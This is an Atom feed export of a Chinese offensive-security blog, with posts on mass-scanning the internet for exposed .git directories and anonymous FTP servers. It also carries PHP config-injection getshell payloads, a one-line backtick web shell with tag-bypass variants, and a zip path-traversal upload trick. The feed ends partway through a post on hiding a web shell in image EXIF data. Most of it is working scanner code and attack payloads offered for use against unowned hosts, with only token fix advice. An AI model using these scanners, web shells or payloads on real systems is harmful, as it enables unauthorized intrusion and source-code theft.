<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title><![CDATA[FreeV's Blog]]></title>
  
  <link href="/atom.xml" rel="self"/>
  <link href="http://yoursite.com/"/>
  <updated>2016-05-09T05:05:12.104Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name><![CDATA[FreeV]]></name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title><![CDATA[git泄漏批量实现]]></title>
    <link href="http://yoursite.com/2016/05/09/git%E6%89%B9%E9%87%8F%E5%AE%9E%E7%8E%B0/"/>
    <id>http://yoursite.com/2016/05/09/git批量实现/</id>
    <published>2016-05-09T04:40:00.000Z</published>
    <updated>2016-05-09T05:05:12.104Z</updated>
    <content type="html"><![CDATA[<p>本文总阅读量<span id="busuanzi_value_page_pv"></span>次</p>
<h2 id="0x00__u6F0F_u6D1E_u5206_u6790"><a href="#0x00__u6F0F_u6D1E_u5206_u6790" class="headerlink" title="0x00 漏洞分析"></a>0x00 漏洞分析</h2><p></p><h4>随意代码托管给程序员带来的方便，git泄露也随之普遍，包括一个大厂商判断也简单，<a href="http://www.baidu.com/.git/index" target="_blank" rel="external">http://www.baidu.com/.git/index</a> 如果存在就可以利用了，<br>可以利用工具，审计源码，拿到shell<p></p>
<h2 id="0x01__u6F0F_u6D1E_u5229_u7528"><a href="#0x01__u6F0F_u6D1E_u5229_u7528" class="headerlink" title="0x01 漏洞利用"></a>0x01 漏洞利用</h2><p></p><h4>说到批量，不得不提的就是如何获取全国的80端口ip，zmap是一个不错的选择，关于中国ip段，网上还是有很多方法获取到，漏洞效率目前还可以一万个80端口ip能扫到8个左右的git泄露。那中国那么多ip还是可观的。<p></p>
<h2 id="0x02__u4EE3_u7801_u5B9E_u73B0"><a href="#0x02__u4EE3_u7801_u5B9E_u73B0" class="headerlink" title="0x02 代码实现"></a>0x02 代码实现</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">import</span>  threading</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> linecache</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">is_git</span><span class="params">(host,num)</span>:</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        s=requests.get(<span class="string">'http://'</span>+host+<span class="string">'/.git/index'</span>,allow_redirects = <span class="keyword">False</span>,timeout=<span class="number">3</span>,verify=<span class="keyword">False</span>)</span><br><span class="line">        su=s.status_code</span><br><span class="line">        html=s.text</span><br><span class="line">        <span class="keyword">if</span> su==<span class="number">200</span> <span class="keyword">and</span> get_real(html[<span class="number">0</span>:<span class="number">4</span>]):</span><br><span class="line">            <span class="keyword">print</span> (<span class="string">'%d :%s ok'</span>%(num,host))</span><br><span class="line">            gitfile.write(host+<span class="string">'\n'</span>)</span><br><span class="line">        <span class="keyword">else</span>: <span class="keyword">print</span> (<span class="string">'%d :%s no really'</span>%(num,host))</span><br><span class="line">    <span class="keyword">except</span> Exception,ex:</span><br><span class="line">         <span class="keyword">print</span> (<span class="string">'%d :%s %s'</span>%(num,host,ex))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_real</span><span class="params">(html)</span>:</span></span><br><span class="line">   <span class="comment"># print html</span></span><br><span class="line">    <span class="keyword">if</span> html==<span class="string">'DIRC'</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">True</span></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getlin</span><span class="params">(li)</span>:</span></span><br><span class="line">    con=linecache.getline(hostpath,li).strip(<span class="string">'\n\r\t'</span>)</span><br><span class="line">    <span class="keyword">if</span> con: <span class="keyword">return</span> con</span><br><span class="line">    <span class="keyword">else</span>: <span class="keyword">return</span> <span class="keyword">None</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    x=<span class="number">0</span></span><br><span class="line">    a=len(linecache.getlines(hostpath))</span><br><span class="line">    threads=[]</span><br><span class="line">    th=<span class="number">30</span></span><br><span class="line">    <span class="keyword">while</span> x&lt;a:</span><br><span class="line">        flag=<span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(x,th+x):</span><br><span class="line">            <span class="keyword">if</span> getlin(i+<span class="number">1</span>):</span><br><span class="line">                flag+=<span class="number">1</span></span><br><span class="line">                temp=threading.Thread(target=is_git,args=(getlin(i+<span class="number">1</span>),i))</span><br><span class="line">                threads.append(temp)</span><br><span class="line">            <span class="keyword">else</span>: <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(x,len(threads)):</span><br><span class="line">            threads[i].start()</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(x,len(threads)):</span><br><span class="line">            threads[i].join()</span><br><span class="line">        x=x+th</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ ==<span class="string">'__main__'</span>:</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> len(sys.argv)==<span class="number">3</span>:</span><br><span class="line">        hostpath=sys.argv[<span class="number">1</span>]</span><br><span class="line">        gitpath=sys.argv[<span class="number">2</span>]</span><br><span class="line">       </span><br><span class="line">        gitfile=open(gitpath,<span class="string">'a'</span>)</span><br><span class="line">        main()</span><br><span class="line">    <span class="keyword">else</span>:  <span class="keyword">print</span> <span class="string">"python git.py   host.txt    git.txt "</span></span><br></pre></td></tr></table></figure>
<h2 id="0x03__u6F0F_u6D1E_u4FEE_u590D"><a href="#0x03__u6F0F_u6D1E_u4FEE_u590D" class="headerlink" title="0x03 漏洞修复"></a>0x03 漏洞修复</h2><p></p><h4>检查网站目录下是否存在.git目录。删除目录。<p></p>
<p></p><h4>网盘链接:链接：<a href="http://pan.baidu.com/s/1i5KwrdF" target="_blank" rel="external">http://pan.baidu.com/s/1i5KwrdF</a> 密码：rhau<p></p>
<pre><code>Author:FreeV
</code></pre></h4></h4></h4></h4>]]></content>
    <summary type="html">
    <![CDATA[<p>本文总阅读量<span id="busuanzi_value_page_pv"></span>次</p>
<h2 id="0x00__u6F0F_u6D1E_u5206_u6790"><a href="#0x00__u6F0F_u6D1E_u5206_u6790" clas]]>
    </summary>
    
      <category term="python" scheme="http://yoursite.com/tags/python/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[pyhton多线程批量ftp未授权访问漏洞]]></title>
    <link href="http://yoursite.com/2016/04/11/pyhton%E5%A4%9A%E7%BA%BF%E7%A8%8B%E6%89%B9%E9%87%8Fftp%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/"/>
    <id>http://yoursite.com/2016/04/11/pyhton多线程批量ftp未授权访问漏洞/</id>
    <published>2016-04-11T13:32:32.000Z</published>
    <updated>2016-05-09T05:02:47.232Z</updated>
    <content type="html"><![CDATA[<p>本文总阅读量<span id="busuanzi_value_page_pv"></span>次</p>
<h2 id="0x00__u6F0F_u6D1E_u5206_u6790"><a href="#0x00__u6F0F_u6D1E_u5206_u6790" class="headerlink" title="0x00 漏洞分析"></a>0x00 漏洞分析</h2><p></p><h4>ftp未授权访问是一个很老的漏洞了,现在包括vsftp在内的很多主流的ftp软件都默认配置都存在这个漏洞，不过在linux下vsftp默认配置没有上传权限，只有读的权限，也就是说如果管理员装有vsftp并且没有进行配置，那么那就有机会观赏网站的源码了，<br>如果在windows中好多网站还是可以直接上传shell的，所谓的ftp未授权就是ftp匿名登录。关于vsftp配置相关文章：</h4><br><a href="http://www.osyunwei.com/archives/9006.html" target="_blank" rel="external">http://www.osyunwei.com/archives/9006.html</a><br><a href="http://www.cnblogs.com/JemBai/archive/2009/02/05/1384413.html" target="_blank" rel="external">http://www.cnblogs.com/JemBai/archive/2009/02/05/1384413.html</a><p></p>
<h2 id="0x01__u6F0F_u6D1E_u5229_u7528"><a href="#0x01__u6F0F_u6D1E_u5229_u7528" class="headerlink" title="0x01 漏洞利用"></a>0x01 漏洞利用</h2><p></p><h4>先用zmap扫描全国ip 21端口，然后利用一下脚本跑就可以了。如果你想要直接上传shell的权限，就在zmap扫描端口中加上3389。扫描结果中还是包含很多电影资源ftp等，你可以在判断一下比如在ftp.nlst()函数的返回结果中判断是否包含 “web.config,www,web,index.html”等关键字<br></h4><br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> linecache</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">from</span> ftplib <span class="keyword">import</span> FTP</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">ftpfile=open(<span class="string">'ftp1.txt'</span>,<span class="string">'a'</span>)</span><br><span class="line">hostpath=<span class="string">'host.txt'</span>   </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">is_anonymous</span><span class="params">(ip,num)</span>:</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        ftp =FTP(ip,timeout=<span class="number">3</span>)</span><br><span class="line">        <span class="keyword">if</span> ftp.login() <span class="keyword">and</span> len(ftp.nlst())&gt;<span class="number">2</span>:</span><br><span class="line">            ftp.quit()</span><br><span class="line">            num+=<span class="number">1</span></span><br><span class="line">            <span class="keyword">print</span> (<span class="string">"%s : %s ok"</span>%(num,ip))</span><br><span class="line">            ftpfile.write(ip+<span class="string">'\n'</span>)  </span><br><span class="line">        <span class="keyword">else</span> : </span><br><span class="line">            <span class="keyword">print</span> (<span class="string">"%s : %s nothing"</span>%(num,ip))</span><br><span class="line">            num+=<span class="number">1</span></span><br><span class="line">            </span><br><span class="line">    <span class="keyword">except</span> Exception,ex:</span><br><span class="line">        <span class="keyword">print</span> (<span class="string">"%s : %s %s"</span>%(num,ip,ex))</span><br><span class="line">        num+=<span class="number">1</span></span><br><span class="line">truetrue</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getlin</span><span class="params">(li)</span>:</span></span><br><span class="line">    con=linecache.getline(hostpath,li).strip(<span class="string">'\n\r\t'</span>)</span><br><span class="line">    <span class="keyword">if</span> con: <span class="keyword">return</span> con</span><br><span class="line">    <span class="keyword">else</span>: <span class="keyword">return</span> <span class="keyword">None</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line"></span><br><span class="line">    x=<span class="number">0</span></span><br><span class="line">    a=len(linecache.getlines(hostpath))</span><br><span class="line">    threads=[]</span><br><span class="line">    th=<span class="number">20</span></span><br><span class="line">    <span class="keyword">while</span> x&lt;a:</span><br><span class="line">        flag=<span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(x,th+x):</span><br><span class="line">            <span class="keyword">if</span> getlin(i+<span class="number">1</span>):</span><br><span class="line">                flag+=<span class="number">1</span></span><br><span class="line">                temp=threading.Thread(target=is_anonymous,args=(getlin(i+<span class="number">1</span>),i))</span><br><span class="line">                threads.append(temp)</span><br><span class="line">            <span class="keyword">else</span>: <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(x,len(threads)): </span><br><span class="line">            threads[i].start()</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(x,len(threads)):</span><br><span class="line">            threads[i].join()</span><br><span class="line">        x=x+th</span><br><span class="line">        </span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p></p>
<p></p><h4>网盘链接: 链接：<a href="http://pan.baidu.com/s/1bB56Ku" target="_blank" rel="external">http://pan.baidu.com/s/1bB56Ku</a> 密码：u44c<p></p>
<pre><code>Author:FreeV
</code></pre></h4>]]></content>
    <summary type="html">
    <![CDATA[<p>本文总阅读量<span id="busuanzi_value_page_pv"></span>次</p>
<h2 id="0x00__u6F0F_u6D1E_u5206_u6790"><a href="#0x00__u6F0F_u6D1E_u5206_u6790" clas]]>
    </summary>
    
      <category term="python" scheme="http://yoursite.com/tags/python/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[后台配置getshell总结]]></title>
    <link href="http://yoursite.com/2016/02/06/%E5%90%8E%E5%8F%B0%E9%85%8D%E7%BD%AEgetshell%E6%80%BB%E7%BB%93/"/>
    <id>http://yoursite.com/2016/02/06/后台配置getshell总结/</id>
    <published>2016-02-06T11:03:24.000Z</published>
    <updated>2016-02-06T11:30:53.128Z</updated>
    <content type="html"><![CDATA[<p>本文总阅读量<span id="busuanzi_value_page_pv"></span>次</p>
<h2 id="0x00__u914D_u7F6E_u6587_u4EF6_u5355_u5F15_u53F7"><a href="#0x00__u914D_u7F6E_u6587_u4EF6_u5355_u5F15_u53F7" class="headerlink" title="0x00 配置文件单引号"></a>0x00 配置文件单引号</h2><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">    <span class="variable">$host</span>=<span class="string">'127.0.0.1'</span>;</span><br><span class="line">    <span class="variable">$uncode</span>=<span class="string">'1'</span>;</span><br><span class="line">    <span class="variable">$username</span>=<span class="string">'xx'</span>;</span><br><span class="line">    <span class="variable">$upload</span>=<span class="string">'a'</span>;</span><br><span class="line">?&gt;</span><br><span class="line">   //利用反斜杠转义第二个单引号  利用‘//‘注释后面语句</span><br><span class="line">&lt;?php </span><br><span class="line">    <span class="variable">$host</span>=<span class="string">'127.0.0.1\'</span>;</span><br><span class="line">    <span class="variable">$uncode</span>=<span class="string">';echo '</span><span class="number">1</span><span class="string">';//11'</span>;</span><br><span class="line">    <span class="variable">$username</span>=<span class="string">'xx'</span>;</span><br><span class="line">    <span class="variable">$upload</span>=<span class="string">'a'</span>;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<h2 id="0x01__u914D_u7F6E_u6587_u4EF6_u53CC_u5F15_u53F7"><a href="#0x01__u914D_u7F6E_u6587_u4EF6_u53CC_u5F15_u53F7" class="headerlink" title="0x01 配置文件双引号"></a>0x01 配置文件双引号</h2><p></p><h4>利用php双引号特点<p></p>
<figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">    <span class="variable">$host</span>=<span class="string">"&#123;$&#123;`net user`&#125;&#125;"</span>;</span><br><span class="line">    <span class="variable">$uncode</span>=<span class="string">"utf-8"</span>;</span><br><span class="line">    <span class="variable">$username</span>=<span class="string">"xx"</span>;</span><br><span class="line">    <span class="variable">$upload</span>=<span class="string">'/a'</span>;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>//如果配置文件对敏感字符进行转义而没有对 ‘/’进行转义</p>
<h2 id="0x02__u914D_u7F6E_u6587_u4EF6_u5355_u5F15_u53F7"><a href="#0x02__u914D_u7F6E_u6587_u4EF6_u5355_u5F15_u53F7" class="headerlink" title="0x02 配置文件单引号"></a>0x02 配置文件单引号</h2><h2 id="0x03__u914D_u7F6E_u6587_u4EF6_u5355_u5F15_u53F7"><a href="#0x03__u914D_u7F6E_u6587_u4EF6_u5355_u5F15_u53F7" class="headerlink" title="0x03 配置文件单引号"></a>0x03 配置文件单引号</h2></h4>]]></content>
    <summary type="html">
    <![CDATA[<p>本文总阅读量<span id="busuanzi_value_page_pv"></span>次</p>
<h2 id="0x00__u914D_u7F6E_u6587_u4EF6_u5355_u5F15_u53F7"><a href="#0x00__u914D_u7F6E]]>
    </summary>
    
      <category term="渗透技巧" scheme="http://yoursite.com/tags/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[一个php木马引发的xxoo]]></title>
    <link href="http://yoursite.com/2016/01/30/%E4%B8%80%E4%B8%AAphp%E6%9C%A8%E9%A9%AC%E5%BC%95%E5%8F%91%E7%9A%84xxoo/"/>
    <id>http://yoursite.com/2016/01/30/一个php木马引发的xxoo/</id>
    <published>2016-01-30T01:27:25.000Z</published>
    <updated>2016-01-30T02:06:28.992Z</updated>
    <content type="html"><![CDATA[<p>本文总阅读量<span id="busuanzi_value_page_pv"></span>次</p>
<h2 id="0x00__u5076_u9047php_u9A6C"><a href="#0x00__u5076_u9047php_u9A6C" class="headerlink" title="0x00 偶遇php马"></a>0x00 偶遇php马</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="preprocessor">&lt;?</span>=`<span class="variable">$_GET</span>[<span class="number">1</span>]`;</span><br><span class="line">&lt;% <span class="keyword">echo</span> `<span class="variable">$_GET</span>[<span class="number">1</span>]`%&gt;</span></span><br></pre></td></tr></table></figure>
<p><br></p>
<h2 id="0x01__u53EF_u6267_u884Cphp_u4EE3_u7801_u7684_u6807_u7B7E"><a href="#0x01__u53EF_u6267_u884Cphp_u4EE3_u7801_u7684_u6807_u7B7E" class="headerlink" title="0x01 可执行php代码的标签"></a>0x01 可执行php代码的标签</h2><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="var_expand">% echo <span class="escape">`$</span>_GET[1]<span class="escape">`%</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p></p><h4>需要开启asp_tags=On<p></p>
<p></p><h4>php3可以通过 short_tags() 函数激活使用短标签 <p></p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="preprocessor">&lt;?</span> phpinfo()<span class="preprocessor">?&gt;</span></span></span><br></pre></td></tr></table></figure>
<p></p><h4>需要在phpini中开启shor_tags()<p></p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="title">script</span> <span class="attribute">language</span>=<span class="value">"php"</span>&gt;</span><span class="undefined"></span><br><span class="line">echo phpinfo;</span><br><span class="line"></span><span class="tag">&lt;/<span class="title">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p></p><h4>通过js执行php代码<p></p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="preprocessor">&lt;?</span>=`<span class="variable">$_GET</span>[<span class="number">1</span>]`;</span></span><br></pre></td></tr></table></figure>
<p></p><h4>这里‘=’相当于echo<p></p>
<h2 id="0x02__u603B_u7ED3"><a href="#0x02__u603B_u7ED3" class="headerlink" title="0x02 总结"></a>0x02 总结</h2><p></p><h4>闭合标签可以不必要写，但是需要加上‘;’<p></p>
<p></p><h4>以上php执行方式通常用于bypass绕过php执行标签<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;% <span class="keyword">echo</span> <span class="string">'xx'</span> %&gt;</span><br><span class="line">&lt;% <span class="keyword">echo</span> <span class="string">'xx'</span>;</span><br><span class="line"><span class="preprocessor">&lt;?</span> <span class="keyword">echo</span> <span class="string">'xx'</span> <span class="preprocessor">?&gt;</span></span><br><span class="line"><span class="preprocessor">&lt;?</span> <span class="keyword">echo</span> <span class="string">'xx'</span>;</span><br><span class="line"><span class="preprocessor">&lt;?php</span> <span class="keyword">echo</span> <span class="string">'xx'</span> <span class="preprocessor">?&gt;</span></span><br><span class="line"><span class="preprocessor">&lt;?php</span> <span class="keyword">echo</span> <span class="string">'xx'</span>;</span><br></pre></td></tr></table></figure><p></p>
</h4></h4></h4></h4></h4></h4></h4>]]></content>
    <summary type="html">
    <![CDATA[<p>本文总阅读量<span id="busuanzi_value_page_pv"></span>次</p>
<h2 id="0x00__u5076_u9047php_u9A6C"><a href="#0x00__u5076_u9047php_u9A6C" class="hea]]>
    </summary>
    
      <category term="php代码安全" scheme="http://yoursite.com/tags/php%E4%BB%A3%E7%A0%81%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[上传之万恶的zip]]></title>
    <link href="http://yoursite.com/2015/12/16/%E4%B8%8A%E4%BC%A0%E4%B9%8B%E4%B8%87%E6%81%B6%E7%9A%84zip/"/>
    <id>http://yoursite.com/2015/12/16/上传之万恶的zip/</id>
    <published>2015-12-16T03:46:22.000Z</published>
    <updated>2015-12-17T07:28:02.584Z</updated>
    <content type="html"><![CDATA[<p>本文总阅读量<span id="busuanzi_value_page_pv"></span>次</p>
<h2 id="0x00_zip_u6587_u4EF6_u7ED3_u6784"><a href="#0x00_zip_u6587_u4EF6_u7ED3_u6784" class="headerlink" title="0x00 zip文件结构"></a>0x00 zip文件结构</h2><p></p><h4>1,找一张图片命令xxx11.jpg然后压缩<p></p>
<p></p><h4>2,用二进制文件编辑器打开，我这里用的是UE，ctrl+f查找xxx替换成../，(注意有两处)<p></p>
<p></p><h4>3,然后解压，你会发现11.jpg文件被解压到了文件目录的上一层<p></p>
<h2 id="0X01__u5229_u7528"><a href="#0X01__u5229_u7528" class="headerlink" title="0X01 利用"></a>0X01 利用</h2><p></p><h4>如果我们在渗透过程中遇到zip上传，而且解压，但是解压之后的文件目录没有php的执行权限，或者php文件被自动删除。<p></p>
<p></p><h4>那么zip大法就能搞定了，附上解压代码。<p></p>
<pre><code>&lt;?php 
    header(&quot;Content-type:text/html;charset=utf-8&quot;);
    function get_zip($filename,$path=null){

        $i=0;
        if(!file_exists($filename))
            die (&quot;&quot;);
        $filename=iconv(&apos;utf-8&apos;,&apos;gb2312&apos;,$filename);
        $path=iconv(&apos;utf-8&apos;,&apos;gb2312&apos;,$path);
        $resource = zip_open($filename);
        while($dir_res=zip_read($resource)){

            if (zip_entry_open($resource,$dir_res)) {
                $res_name= zip_entry_name($dir_res);

                $file_name = $path.$res_name;
                echo $file_name;
                $file_path = substr($file_name,0,strrpos($file_name, &quot;/&quot;));
                if(!is_dir($file_path)){
                    mkdir($file_path,0777,true);
                }
                if(!is_dir($file_name)){
                    $file_size=zip_entry_filesize($dir_res);
                    if($file_size&lt;(1024*1024*6)){
                        $file_content = zip_entry_read($dir_res,$file_size);
                        file_put_contents($file_name,$file_content);
                    }else{
                        echo &quot;&lt;p&gt; &quot;.$i++.&quot; ， -&gt; &quot;.iconv(&quot;gb2312&quot;,&quot;utf-8&quot;,$file_name).&quot; &lt;/p&gt;&quot;;
                    }

                }
            }

        }

    }
    get_zip(&quot;11.zip&quot;,&apos;temp/&apos;);
?&gt;
</code></pre><h2 id="0X03__u6269_u5C55"><a href="#0X03__u6269_u5C55" class="headerlink" title="0X03 扩展"></a>0X03 扩展</h2><p></p><h4>如果我们有权限，也可以在解压目录中创建目录<p></p>
<p></p><h4>原理相同把上述的xxx改成xx/，那么就会在文件目录下创建一个xx的目录，图片的路径就变成了temp/xx/11.jpg<p></p>
<pre><code>Author:FreeV
</code></pre></h4></h4></h4></h4></h4></h4></h4>]]></content>
    <summary type="html">
    <![CDATA[<p>本文总阅读量<span id="busuanzi_value_page_pv"></span>次</p>
<h2 id="0x00_zip_u6587_u4EF6_u7ED3_u6784"><a href="#0x00_zip_u6587_u4EF6_u7ED3_u6784]]>
    </summary>
    
      <category term="渗透技巧" scheme="http://yoursite.com/tags/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[php高级图片隐藏马]]></title>
    <link href="http://yoursite.com/2015/12/11/php%E9%AB%98%E7%BA%A7%E5%9B%BE%E7%89%87%E9%9A%90%E8%97%8F%E9%A9%AC/"/>
    <id>http://yoursite.com/2015/12/11/php高级图片隐藏马/</id>
    <published>2015-12-11T07:47:50.000Z</published>
    <updated>2016-05-09T04:29:13.065Z</updated>
    <content type="html"><![CDATA[<p>本文总阅读量<span id="busuanzi_value_page_pv"></span>次</p>
<h2 id="0x00_EXIF"><a href="#0x00_EXIF" class="headerlink" title="0x00 EXIF"></a>0x00 EXIF</h2><p></p><h4>Exif是一种图像文件格式，它的数据存储与JPEG格式是完全相同的。实际上Exif格式就是在<p></p>
<p></p><h4>JPEG格式头部插入了数码照片的信息，包括拍摄时的光圈、快门、白平衡、ISO、焦距、日期时间等各种和拍摄条件以及相机品牌、型号、色彩编码、拍摄时录制的声音以及GPS全球定位系统数据、缩略图等。你可以利用任何可以查看JPEG文件的看图软件浏览Exif格式的照片，但并不是所有的图形程序都能处理Exif信息<p></p>
<p></p><h4>php 中exif_read_data,可以读取EXIF的信息头，但是需要开启php_exif的模板<p></p>
<figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php </span><br><span class="line"></span><br><span class="line"><span class="variable">$exif</span>=exif_read_data(<span class="string">'11.jpg'</span>);</span><br><span class="line">var_dump(<span class="variable">$exif</span>);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>  </p><h4>输出<br>  <figure class="highlight zephir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">array</span></span><br><span class="line"><span class="string">'FileName'</span> =&gt; string <span class="string">'11.jpg'</span> (length=<span class="number">6</span>)</span><br><span class="line"><span class="string">'FileDateTime'</span> =&gt; <span class="keyword">int</span> <span class="number">1449824391</span></span><br><span class="line"><span class="string">'FileSize'</span> =&gt; <span class="keyword">int</span> <span class="number">96252</span></span><br><span class="line"><span class="string">'FileType'</span> =&gt; <span class="keyword">int</span> <span class="number">2</span></span><br><span class="line"><span class="string">'MimeType'</span> =&gt; string <span class="string">'image/jpeg'</span> (length=<span class="number">10</span>)</span><br><span class="line"><span class="string">'SectionsFound'</span> =&gt; string <span class="string">'ANY_TAG, IFD0, EXIF'</span> (length=<span 